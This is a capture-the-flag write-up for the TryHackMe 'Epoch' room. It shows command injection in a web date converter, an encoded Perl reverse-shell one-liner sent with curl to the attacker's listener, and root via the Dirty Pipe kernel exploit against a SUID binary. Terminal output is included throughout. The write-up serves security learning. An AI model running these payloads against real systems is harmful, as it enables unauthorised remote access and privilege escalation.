# THM/Epoch ⌛
Writeup for ![Epoch](https://tryhackme.com/room/epoch#) on https://tryhackme.com
## Command Injection
Normally an `nmap` scan of the target is needed but the room harbours no illusions that the entry point for this box lies on a web interface on port 80 and features a command injection vulnerability, so we'll start there.
The web page features a simple program that allows users to convert Epoch to UTC...  
![alt text](https://github.com/p1ckzi/CTFs/blob/main/THM-Epoch/epoch-to-utc-converter.png)  
Submitting anything other than a date seems to throw an `exit 1` code but after only a moment it can be seen that the `&` symbol allows users to add additional code after a date is provided:  
![alt text](https://github.com/p1ckzi/CTFs/blob/main/THM-Epoch/command-injection-1.png)  
No interception of the request was needed via Burp Suite. Already we have command injection.
## 🦶 Foothold
At this point we can navigate the system to some degree just using command injection but having a shell on the system makes our life much easier.  
The `which` command was used to try to find common programs like netcat for this purpose of creating a reverse shell but it appears these are unavailable to us since searching for programs like `nc`, `netcat`, `socat`, `python`, etc, all throw `exit 1` errors.  
However `perl` is available and we can see this by using `which perl`:  
![alt text](https://github.com/p1ckzi/CTFs/blob/main/THM-Epoch/command-injection-2.png)  
A reverse shell can be created with `perl`.  
A popular resource for reverse shells is pentest monkey's reverse shell cheat sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet which includes one for `perl`.
In our terminal we set up a listener on port 9999 with `nc`:  
```
nc -lnvp 9999
```
The `curl` command was used to make a web request to the Epoch to UTC Converter webpage. The web request also contains a year, the `&` symbol and then the perl reverse shell to our attacking machine's' listening port:
```
curl http://10.10.227.130/?epoch=2022%26perl+-e+%27use+Socket%3B%24i%3D%2210.14.34.152%22%3B%24p%3D9999%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%27
```
We now have a foothold on the machine as the user *challenge*.
### Terminal output:
```
┌──(p1ckzi㉿kali)-[~]                                                                     
└─$ nc -lnvp 9999                                                                         
Ncat: Version 7.93 ( https://nmap.org/ncat )                                               
Ncat: Listening on :::9999                                                                 
Ncat: Listening on 0.0.0.0:9999                                                           
Ncat: Connection from 10.10.227.130.                                                       
Ncat: Connection from 10.10.227.130:34444.                                                 
/bin/sh: 0: can't access tty; job control turned off                                       
$ whoami                                                                                   
challenge
```
* * *
## 🚩 Flag
Simple enumeration finds us the only flag we need for this box. We can do this will common tools such as `linpeas.sh` available at https://github.com/carlospolop/PEASS-ng/releases/download/20221106/linpeas.sh.  
But requesting the environment variables finds us the flag with the `env` command.
### Terminal Output:
```
$ env                                                                                     
HOSTNAME=e7c1352e71ec                                                                     
SHLVL=1                                           
HOME=/home/challenge                              
_=whoami                                          
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin       
PWD=/home/challenge                               
GOLANG_VERSION=1.15.7                             
FLAG=****{********************************}
```
Done! 🏆
* * *
## 🚩 Root
There'ss no flag for root but lets try to get that anyway.  
If the latest `linpeas.sh` was used you'll see that the box is vulnerable to `CVE-2022-0847`, also known as dirtypipe but this can also be confirmed using system commands.  
A good a resource on this can be found at https://sysdig.com/blog/cve-2022-0847-dirty-pipe-sysdig/.  
The vulnerability exists in kernel versions between v5.8 and v5.15 and this can be identified using the `uname -r` command which shows that indeed, the box is running an older version...
### Terminal Output:
```
$ uname -r                                        
5.13.0-1014-aws
```
The flaw lies in Linux kernel memory management functionality with how pipe page caches can be merged and overwrite other page caches.  
For the exploit to work an attacker first needs to access a shell on a system through some means, as we have done. This may be with a regular person’s account, or a system accounts for running services that are vulnerable to remote attacks.  The attacker then needs to find an interesting file they can read to illegally overwrite. So for example, password and configuration files in `/etc` that are normally read-only are a likely choice for an attacker to target.  
The attacker can run a program to open a pipe, then fill the page caches with bytes to set the `PIPE_BUF_FLAG_CAN_MERGE` flag, then empty and replace it with the data they want to overwrite with. Then, `splice()` is called to merge the pages together. The `PIPE_BUF_FLAG_CAN_MERGE` flag causes the new data to be merged back into the original target file and circumvents the read-only restriction.
A proof-of-concept was released the day after the disclosure by author Blasty at https://haxx.in/ and shows how this flaw can be leveraged to create a SUID shell backdoor. By using the same technique to overwrite a file, the exploit overwrites an executable that has SUID permissions - and is able to run as the superuser. The exploit overwrites the command with a shell, runs it to create a SUID shell in `/tmp`, and then replaces the original executable.  
His proof-of-concept can be found at https://haxx.in/files/dirtypipez.c and does all the hard work for us.  
The file can be uploaded to the target using common methods (the `/tmp` directory has write access) and then compiled since the `gcc` command is also available to us:
```
gcc dirtypipez.c -o dirty
```
From there, we just need to provide an SUID binary to the executable we compiled.
We can find that using
```
find / -perm -u=s -type f 2>/dev/null
```
There's many resources for linux privilege escalation. One great one with many different techniques is https://book.hacktricks.xyz/linux-hardening/privilege-escalation and goes into depth on escalation using SUID binaries.
For our purpose we'll just use the first `/usr/bin/chfn` binary.
### Terminal Output:
```
$ find / -perm -u=s -type f 2>/dev/null                                                             
/usr/bin/chfn                                     
/usr/bin/umount                                   
/usr/bin/passwd                                   
/usr/bin/gpasswd                                  
/usr/bin/newgrp                                   
/usr/bin/chsh                                     
/usr/bin/su                                       
/usr/bin/mount
```
We can use the `chmod +x <file>` command to make our compiled exploit executable, and direct it at the SUID binary with:
```
chmod +x dirty
./dirty /usr/bin/chfn
```
We now have root on the box.
### Terminal output:
```
$ ./dirty
Usage: ./dirty SUID
$ ./dirty /usr/bin/chfn
whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```
Epoch on https://tryhackme.com
